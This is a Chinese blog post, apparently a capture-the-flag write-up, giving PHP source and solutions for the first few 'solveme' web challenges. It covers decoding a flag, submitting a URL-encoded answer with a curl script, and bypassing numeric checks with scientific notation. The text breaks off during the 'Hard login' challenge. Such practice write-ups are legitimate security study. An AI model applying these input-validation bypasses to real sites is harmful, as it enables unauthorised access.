<!DOCTYPE html>
<html style="display: none;" lang="zh">
    <head>
    <meta charset="utf-8">
    <!--
        © Material Theme
        https://github.com/viosey/hexo-theme-material
        Version: 1.5.2 -->
    <script>
        window.materialVersion = "1.5.2"
        // Delete localstorage with these tags
        window.oldVersion = [
            'codestartv1',
            '1.3.4',
            '1.4.0',
            '1.4.0b1',
            '1.5.0'
        ]
    </script>

    <!-- dns prefetch -->
    <meta http-equiv="x-dns-prefetch-control" content="on">














    <!-- Meta & Info -->
    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    <!-- Title -->
    
    <title>
        
            solveme | 
        
        RingFa1l
    </title>

    <!-- Favicons -->
    <link rel="icon shortcut" type="image/ico" href="/img/ling.png">
    <link rel="icon" href="/img/ling.png">

    <meta name="format-detection" content="telephone=no"/>
    <meta name="description" itemprop="description" content="">
    <meta name="keywords" content="null">
    <meta name="theme-color" content="#0097A7">

    <!-- Disable Fucking Bloody Baidu Tranformation -->
    <meta http-equiv="Cache-Control" content="no-transform" />
    <meta http-equiv="Cache-Control" content="no-siteapp" />

    <!--[if lte IE 9]>
        <link rel="stylesheet" href="/css/ie-blocker.css">

        
            <script src="/js/ie-blocker.zhCN.js"></script>
        
    <![endif]-->

    <!-- Import lsloader -->
    <script>(function(){window.lsloader={jsRunSequence:[],jsnamemap:{},cssnamemap:{}};lsloader.removeLS=function(a){try{localStorage.removeItem(a)}catch(b){}};lsloader.setLS=function(a,c){try{localStorage.setItem(a,c)}catch(b){}};lsloader.getLS=function(a){var c="";try{c=localStorage.getItem(a)}catch(b){c=""}return c};versionString="/*"+(window.materialVersion||"unknownVersion")+"*/";lsloader.clean=function(){try{var b=[];for(var a=0;a<localStorage.length;a++){b.push(localStorage.key(a))}b.forEach(function(e){var f=lsloader.getLS(e);if(window.oldVersion){var d=window.oldVersion.reduce(function(g,h){return g||f.indexOf("/*"+h+"*/")!==-1},false);if(d){lsloader.removeLS(e)}}})}catch(c){}};lsloader.clean();lsloader.load=function(f,a,b,d){if(typeof b==="boolean"){d=b;b=undefined}d=d||false;b=b||function(){};var e;e=this.getLS(f);if(e&&e.indexOf(versionString)===-1){this.removeLS(f);this.requestResource(f,a,b,d);return}if(e){var c=e.split(versionString)[0];if(c!=a){console.log("reload:"+a);this.removeLS(f);this.requestResource(f,a,b,d);return}e=e.split(versionString)[1];if(d){this.jsRunSequence.push({name:f,code:e});this.runjs(a,f,e)}else{document.getElementById(f).appendChild(document.createTextNode(e));b()}}else{this.requestResource(f,a,b,d)}};lsloader.requestResource=function(b,e,a,c){var d=this;if(c){this.iojs(e,b,function(h,f,g){d.setLS(f,h+versionString+g);d.runjs(h,f,g)})}else{this.iocss(e,b,function(f){document.getElementById(b).appendChild(document.createTextNode(f));d.setLS(b,e+versionString+f)},a)}};lsloader.iojs=function(d,b,g){var a=this;a.jsRunSequence.push({name:b,code:""});try{var f=new XMLHttpRequest();f.open("get",d,true);f.onreadystatechange=function(){if(f.readyState==4){if((f.status>=200&&f.status<300)||f.status==304){if(f.response!=""){g(d,b,f.response);return}}a.jsfallback(d,b)}};f.send(null)}catch(c){a.jsfallback(d,b)}};lsloader.iocss=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.iofonts=function(f,c,h,a){var b=this;try{var g=new XMLHttpRequest();g.open("get",f,true);g.onreadystatechange=function(){if(g.readyState==4){if((g.status>=200&&g.status<300)||g.status==304){if(g.response!=""){h(g.response);a();return}}b.cssfallback(f,c,a)}};g.send(null)}catch(d){b.cssfallback(f,c,a)}};lsloader.runjs=function(f,c,e){if(!!c&&!!e){for(var b in this.jsRunSequence){if(this.jsRunSequence[b].name==c){this.jsRunSequence[b].code=e}}}if(!!this.jsRunSequence[0]&&!!this.jsRunSequence[0].code&&this.jsRunSequence[0].status!="failed"){var a=document.createElement("script");a.appendChild(document.createTextNode(this.jsRunSequence[0].code));a.type="text/javascript";document.getElementsByTagName("head")[0].appendChild(a);this.jsRunSequence.shift();if(this.jsRunSequence.length>0){this.runjs()}}else{if(!!this.jsRunSequence[0]&&this.jsRunSequence[0].status=="failed"){var d=this;var a=document.createElement("script");a.src=this.jsRunSequence[0].path;a.type="text/javascript";this.jsRunSequence[0].status="loading";a.onload=function(){d.jsRunSequence.shift();if(d.jsRunSequence.length>0){d.runjs()}};document.body.appendChild(a)}}};lsloader.tagLoad=function(b,a){this.jsRunSequence.push({name:a,code:"",path:b,status:"failed"});this.runjs()};lsloader.jsfallback=function(c,b){if(!!this.jsnamemap[b]){return}else{this.jsnamemap[b]=b}for(var a in this.jsRunSequence){if(this.jsRunSequence[a].name==b){this.jsRunSequence[a].code="";this.jsRunSequence[a].status="failed";this.jsRunSequence[a].path=c}}this.runjs()};lsloader.cssfallback=function(e,c,b){if(!!this.cssnamemap[c]){return}else{this.cssnamemap[c]=1}var d=document.createElement("link");d.type="text/css";d.href=e;d.rel="stylesheet";d.onload=d.onerror=b;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(d,a)};lsloader.runInlineScript=function(c,b){var a=document.getElementById(b).innerText;this.jsRunSequence.push({name:c,code:a});this.runjs()}})();</script>

    <!-- Import queue -->
    <script>function Queue(){this.dataStore=[];this.offer=b;this.poll=d;this.execNext=a;this.debug=false;this.startDebug=c;function b(e){if(this.debug){console.log("Offered a Queued Function.")}if(typeof e==="function"){this.dataStore.push(e)}else{console.log("You must offer a function.")}}function d(){if(this.debug){console.log("Polled a Queued Function.")}return this.dataStore.shift()}function a(){var e=this.poll();if(e!==undefined){if(this.debug){console.log("Run a Queued Function.")}e()}}function c(){this.debug=true}}var queue=new Queue();</script>

    <!-- Import CSS -->
    
        <style id="material_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_css","/css/material.min.css?Z7a72R1E4SxzBKR/WGctOA==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>
        <style id="style_css"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("style_css","/css/style.min.css?MKetZV3cUTfDxvMffaOezg==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>

        

    

    

    <!-- Config CSS -->

<!-- Other Styles -->
<style>
  body, html {
    font-family: Roboto, "Helvetica Neue", Helvetica, "PingFang SC", "Hiragino Sans GB", "Microsoft YaHei", "微软雅黑", Arial, sans-serif;
    overflow-x: hidden !important;
  }
  
  code {
    font-family: Consolas, Monaco, 'Andale Mono', 'Ubuntu Mono', monospace;
  }

  a {
    color: #00838F;
  }

  .mdl-card__media,
  #search-label,
  #search-form-label:after,
  #scheme-Paradox .hot_tags-count,
  #scheme-Paradox .sidebar_archives-count,
  #scheme-Paradox .sidebar-colored .sidebar-header,
  #scheme-Paradox .sidebar-colored .sidebar-badge{
    background-color: #0097A7 !important;
  }

  /* Sidebar User Drop Down Menu Text Color */
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:hover,
  #scheme-Paradox .sidebar-colored .sidebar-nav>.dropdown>.dropdown-menu>li>a:focus {
    color: #0097A7 !important;
  }

  #post_entry-right-info,
  .sidebar-colored .sidebar-nav li:hover > a,
  .sidebar-colored .sidebar-nav li:hover > a i,
  .sidebar-colored .sidebar-nav li > a:hover,
  .sidebar-colored .sidebar-nav li > a:hover i,
  .sidebar-colored .sidebar-nav li > a:focus i,
  .sidebar-colored .sidebar-nav > .open > a,
  .sidebar-colored .sidebar-nav > .open > a:hover,
  .sidebar-colored .sidebar-nav > .open > a:focus,
  #ds-reset #ds-ctx .ds-ctx-entry .ds-ctx-head a {
    color: #0097A7 !important;
  }

  .toTop {
    background: #757575 !important;
  }

  .material-layout .material-post>.material-nav,
  .material-layout .material-index>.material-nav,
  .material-nav a {
    color: #757575;
  }

  #scheme-Paradox .MD-burger-layer {
    background-color: #757575;
  }

  #scheme-Paradox #post-toc-trigger-btn {
    color: #757575;
  }

  .post-toc a:hover {
    color: #00838F;
    text-decoration: underline;
  }

</style>


<!-- Theme Background Related-->

    <style>
      body{
        background-color: #F5F5F5;
      }

      /* blog_info bottom background */
      #scheme-Paradox .material-layout .something-else .mdl-card__supporting-text{
        background-color: #fff;
      }
    </style>




<!-- Fade Effect -->

    <style>
      .fade {
        transition: all 800ms linear;
        -webkit-transform: translate3d(0,0,0);
        -moz-transform: translate3d(0,0,0);
        -ms-transform: translate3d(0,0,0);
        -o-transform: translate3d(0,0,0);
        transform: translate3d(0,0,0);
        opacity: 1;
      }

      .fade.out{
        opacity: 0;
      }
    </style>


<!-- Import Font -->
<!-- Import Roboto -->

    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500" rel="stylesheet">


<!-- Import Material Icons -->


    <style id="material_icons"></style><script>if(typeof window.lsLoadCSSMaxNums === "undefined")window.lsLoadCSSMaxNums = 0;window.lsLoadCSSMaxNums++;lsloader.load("material_icons","/css/material-icons.css?pqhB/Rd/ab0H2+kZp0RDmw==",function(){if(typeof window.lsLoadCSSNums === "undefined")window.lsLoadCSSNums = 0;window.lsLoadCSSNums++;if(window.lsLoadCSSNums == window.lsLoadCSSMaxNums)document.documentElement.style.display="";}, false)</script>




    <!-- Import jQuery -->
    
        <script>lsloader.load("jq_js","/js/jquery.min.js?qcusAULNeBksqffqUM2+Ig==", true)</script>
    

    <!-- WebAPP Icons -->
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="application-name" content="RingFa1l">
    <meta name="msapplication-starturl" content="http://ringfall.me/2018/03/18/solveme/">
    <meta name="msapplication-navbutton-color" content="#0097A7">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-title" content="RingFa1l">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon" href="/img/ling.png">

    <!-- Site Verification -->
    
    

    <!-- RSS -->
    

    <!-- The Open Graph protocol -->
    <meta property="og:url" content="http://ringfall.me/2018/03/18/solveme/">
    <meta property="og:type" content="blog">
    <meta property="og:title" content="solveme | RingFa1l">
    <meta property="og:image" content="/img/ling.png">
    <meta property="og:description" content="">
    

    
        <meta property="article:published_time" content="Sun Mar 18 2018 18:33:16 GMT+0800">
        <meta property="article:modified_time" content="Tue Apr 03 2018 23:30:05 GMT+0800">
    

    <!-- The Twitter Card protocol -->
    <meta name="twitter:card" content="summary_large_image">

    <!-- Add canonical link for SEO -->
    
        <link rel="canonical" href="http://ringfall.me/2018/03/18/solveme/index.html" />
    

    <!-- Structured-data for SEO -->
    
        


<script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage": "http://ringfall.me/2018/03/18/solveme/index.html",
    "headline": "solveme",
    "datePublished": "Sun Mar 18 2018 18:33:16 GMT+0800",
    "dateModified": "Tue Apr 03 2018 23:30:05 GMT+0800",
    "author": {
        "@type": "Person",
        "name": "铃落",
        "image": {
            "@type": "ImageObject",
            "url": "/img/2.jpg"
        },
        "description": "铃音不才，纷落为歌。"
    },
    "publisher": {
        "@type": "Organization",
        "name": "RingFa1l",
        "logo": {
            "@type":"ImageObject",
            "url": "/img/ling.png"
        }
    },
    "keywords": "null",
    "description": "",
}
</script>


    

    <!-- Analytics -->
    
    
    

    <!-- Custom Head -->
    

</head>


    
        <body id="scheme-Paradox" class="lazy">
            <div class="material-layout  mdl-js-layout has-drawer is-upgraded">
                

                <!-- Main Container -->
                <main class="material-layout__content" id="main">

                    <!-- Top Anchor -->
                    <div id="top"></div>

                    
                        <!-- Hamburger Button -->
                        <button class="MD-burger-icon sidebar-toggle">
                            <span class="MD-burger-layer"></span>
                        </button>
                    

                    <!-- Post TOC -->

    
    <!-- Back Button -->
    <!--
    <div class="material-back" id="backhome-div" tabindex="0">
        <a class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon"
           href="#" onclick="window.history.back();return false;"
           target="_self"
           role="button"
           data-upgraded=",MaterialButton,MaterialRipple">
            <i class="material-icons" role="presentation">arrow_back</i>
            <span class="mdl-button__ripple-container">
                <span class="mdl-ripple"></span>
            </span>
        </a>
    </div>
    -->


    <!-- Left aligned menu below button -->
    
    
    <button id="post-toc-trigger-btn"
        class="mdl-button mdl-js-button mdl-button--icon">
        <i class="material-icons">format_list_numbered</i>
    </button>

    <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
        <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Warm-up"><span class="post-toc-number">1.</span> <span class="post-toc-text">Warm up</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Bad-compare"><span class="post-toc-number">2.</span> <span class="post-toc-text">Bad compare</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Winter-sleep"><span class="post-toc-number">3.</span> <span class="post-toc-text">Winter sleep</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Hard-login"><span class="post-toc-number">4.</span> <span class="post-toc-text">Hard login</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#URL-filtering"><span class="post-toc-number">5.</span> <span class="post-toc-text">URL filtering</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Hash-collision"><span class="post-toc-number">6.</span> <span class="post-toc-text">Hash collision</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Array2String"><span class="post-toc-number">7.</span> <span class="post-toc-text">Array2String</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Give-me-a-link"><span class="post-toc-number">8.</span> <span class="post-toc-text">Give me a link</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Give-me-a-link-2"><span class="post-toc-number">9.</span> <span class="post-toc-text">Give me a link 2</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Replacefilter"><span class="post-toc-number">10.</span> <span class="post-toc-text">Replacefilter</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Hell-JS"><span class="post-toc-number">11.</span> <span class="post-toc-text">Hell JS</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Anti-SQLi"><span class="post-toc-number">12.</span> <span class="post-toc-text">Anti SQLi</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Namecheck"><span class="post-toc-number">13.</span> <span class="post-toc-text">Namecheck</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#I-am-slowly"><span class="post-toc-number">14.</span> <span class="post-toc-text">I am slowly</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Check-via-eval"><span class="post-toc-number">15.</span> <span class="post-toc-text">Check via eval</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#undefined"><span class="post-toc-number"></span> <span class="post-toc-text">                             Cheap Lottery                            We’ll give you the flag, if you win a chance of 1 in 10,000,000,000!                        </span></a>
    </ul>
    




<!-- Layouts -->

    <!-- Post Module -->
    <div class="material-post_container">

        <div class="material-post mdl-grid">
            <div class="mdl-card mdl-shadow--4dp mdl-cell mdl-cell--12-col">

                <!-- Post Header(Thumbnail & Title) -->
                
    <!-- Paradox Post Header -->
    
        <!-- Custom Thumbnail -->
        <div class="post_thumbnail-custom mdl-card__media mdl-color-text--grey-50" style="background-image:url(https://s1.ax1x.com/2018/03/21/97oklR.png)">
    
            <p class="article-headline-p">
                solveme
            </p>
        </div>





                
                    <!-- Paradox Post Info -->
                    <div class="mdl-color-text--grey-700 mdl-card__supporting-text meta">

    <!-- Author Avatar -->
    <div id="author-avatar">
        <img src="/img/2.jpg" width="44px" height="44px" alt="Author Avatar"/>
    </div>
    <!-- Author Name & Date -->
    <div>
        <strong>铃落</strong>
        <span>3月 18, 2018</span>
    </div>

    <div class="section-spacer"></div>

    <!-- Favorite -->
    <!--
        <button id="article-functions-like-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon btn-like">
            <i class="material-icons" role="presentation">favorite</i>
            <span class="visuallyhidden">favorites</span>
        </button>
    -->

    <!-- Qrcode -->
    

    <!-- Tags (bookmark) -->
    

    <!-- Share -->
    
        <button id="article-fuctions-share-button" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
    <i class="material-icons" role="presentation">share</i>
    <span class="visuallyhidden">share</span>
</button>
<ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-fuctions-share-button">
    

    

    <!-- Share Weibo -->
    
        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=solveme&url=http://ringfall.me/2018/03/18/solveme/index.html&pic=http://ringfall.me/img/ling.png&searchPic=false&style=simple" target="_blank">
            <li class="mdl-menu__item">
                分享到微博
            </li>
        </a>
    

    <!-- Share Twitter -->
    
        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=solveme&url=http://ringfall.me/2018/03/18/solveme/index.html&via=铃落" target="_blank">
            <li class="mdl-menu__item">
                分享到 Twitter
            </li>
        </a>
    

    <!-- Share Facebook -->
    
        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=http://ringfall.me/2018/03/18/solveme/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Facebook
            </li>
        </a>
    

    <!-- Share Google+ -->
    
        <a class="post_share-link" href="https://plus.google.com/share?url=http://ringfall.me/2018/03/18/solveme/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 Google+
            </li>
        </a>
    

    <!-- Share LinkedIn -->
    

    <!-- Share QQ -->
    
        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=RingFa1l&title=solveme&summary=null&pics=http://ringfall.me/img/ling.png&url=http://ringfall.me/2018/03/18/solveme/index.html" target="_blank">
            <li class="mdl-menu__item">
                分享到 QQ
            </li>
        </a>
    

    <!-- Share Telegram -->
    
</ul>

    
</div>

                

                <!-- Post Content -->
                <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
    
        <p>一个风格很棒哒平台诶嘿嘿~直接给源码就很苏糊。。虽然给了难的依旧难23333</p>
<h3 id="Warm-up"><a href="#Warm-up" class="headerlink" title="Warm up"></a>Warm up</h3><p>Are you ready for solve the problems?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">require</span> DIR.<span class="string">'/lib.php'</span>;</div><div class="line">    <span class="keyword">echo</span> base64_encode(hex2bin(strrev(bin2hex($flag)))), <span class="string">'&lt;hr&gt;'</span>;</div><div class="line">    highlight_file(FILE);</div></pre></td></tr></table></figure>
<p>用py写不来QAQ</p>
<p>只能用PHP惹<code>echo hex2bin(strrev(bin2hex(base64_decode(&#39;1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=&#39;))));</code></p>
<p>py哒wp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"></div><div class="line">ciphertext = <span class="string">"1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY="</span></div><div class="line">plaintext = base64.b64decode(ciphertext.encode())</div><div class="line">plaintext = <span class="string">""</span>.join([<span class="string">"%02X"</span> % x <span class="keyword">for</span> x <span class="keyword">in</span> plaintext])</div><div class="line">plaintext = plaintext[::<span class="number">-1</span>]</div><div class="line">plaintext = <span class="string">""</span>.join([chr(int(plaintext[x:x+<span class="number">2</span>], <span class="number">16</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">0</span>, len(plaintext), <span class="number">2</span>)])</div><div class="line"></div><div class="line">print(plaintext)</div></pre></td></tr></table></figure>
<h3 id="Bad-compare"><a href="#Bad-compare" class="headerlink" title="Bad compare"></a>Bad compare</h3><p>Why is it wrong answer?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'answer'</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>($_GET[<span class="string">'answer'</span>] === <span class="string">'роВхУъесЧМ'</span>)&#123;</div><div class="line">            <span class="keyword">echo</span> $flag;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'Wrong answer'</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
<p>真的是糟糕的比较啊。。一看就是编码要搞一搞唔。。然而不叽到用啥吖。。。</p>
<p>第一下用惹py抓取，发现是？？？？然后拿过去请求就报错惹QAQ继续用撒乎乎的PHP</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$url = <span class="string">'http://badcompare.solveme.peng.kr'</span>;</div><div class="line"><span class="comment">//初始化一个 cURL 对象 </span></div><div class="line">$ch  = curl_init();</div><div class="line"><span class="comment">//设置你需要抓取的URL</span></div><div class="line">curl_setopt($ch, CURLOPT_URL, $url);</div><div class="line"><span class="comment">// 设置cURL 参数，要求结果保存到字符串中还是输出到屏幕上。</span></div><div class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line"><span class="comment">//是否获得跳转后的页面</span></div><div class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</div><div class="line">$data = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line">$a=substr($data, <span class="number">917</span>, <span class="number">10</span>);</div><div class="line"><span class="keyword">print</span> $a;</div><div class="line">$urll=$url.<span class="string">'/?answer='</span>.$a;</div><div class="line"><span class="keyword">print</span> $urll;</div><div class="line">$ch  = curl_init();</div><div class="line">curl_setopt($ch, CURLOPT_URL, $urll);</div><div class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</div><div class="line">curl_setopt($ch, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</div><div class="line">$data = curl_exec($ch);</div><div class="line">curl_close($ch);</div><div class="line"><span class="keyword">echo</span> $data;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>emmm没错就是百度上如何使用PHP curl获取页面这个问题下粘过来改改的ORZ</p>
<p>然后有搜到另外的payload是这样哒 <code>http://badcompare.solveme.peng.kr/?answer=%F0%EE%C2%F5%D3%FA%E5%F1%D7%CC</code></p>
<p>果然是编码嘤嘤嘤，可以用 <code>urllib.quote(s.content[917:927])</code> 得到~</p>
<h3 id="Winter-sleep"><a href="#Winter-sleep" class="headerlink" title="Winter sleep"></a>Winter sleep</h3><p>I’m so sleepy. zzz</p>
<p>冬眠！窝也想！！！（瘫。。。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'time'</span>]))&#123;</div><div class="line">        <span class="keyword">if</span>(!is_numeric($_GET[<span class="string">'time'</span>]))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'The time must be number.'</span>;</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">2</span>)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'This time is too short.'</span>;</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>($_GET[<span class="string">'time'</span>] &gt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">3</span>)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'This time is too long.'</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            sleep((int)$_GET[<span class="string">'time'</span>]);</div><div class="line">            <span class="keyword">echo</span> $flag;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
<p>写了个中间的数，然后等吖等，，等了半天才意识到除以3600还是一个很大的数。。。orzzzzz</p>
<p>然后用十六进制试。。。不行</p>
<p>然后用科学计数法6e几试出来的。。</p>
<h3 id="Hard-login"><a href="#Hard-login" class="headerlink" title="Hard login"></a>Hard login</h3><p>When do you give me the flag? When the login succeeds?</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    error_reporting(<span class="number">0</span>);</div><div class="line">    session_start();</div><div class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>], $_GET[<span class="string">'password'</span>]))&#123;</div><div class="line"></div><div class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_SESSION[<span class="string">'hard_login_check'</span>]))&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'Already logged in..'</span>;</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]&#123;<span class="number">3</span>&#125;) || strtolower($_GET[<span class="string">'username'</span>]) != $hidden_username)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'Wrong username..'</span>;</div><div class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'password'</span>]&#123;<span class="number">7</span>&#125;) || $_GET[<span class="string">'password'</span>] != $hidden_password)&#123;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'Wrong password..'</span>;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $_SESSION[<span class="string">'hard_login_check'</span>] = <span class="keyword">true</span>;</div><div class="line">            <span class="keyword">echo</span> <span class="string">'Login success!'</span>;</div><div class="line">            header(<span class="string">'Location: ./'</span>);</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</div><div class="line">    &#125;</div><div class="line">    highlight_file(<span class="keyword">__FILE__</span>);</div></pre></td></tr></table></figure>
<p>嗨呀好坑吖，，虽然第一下想过直接看看./的。。。但是转念一想这不是代码审计嘛。。坑定是找骚操作绕过吧</p>
<p>然后{3}这个貌似是第三个字符不能为空，试了半天取$hidden_username的地址之类的。。本地发现这样不行啊</p>
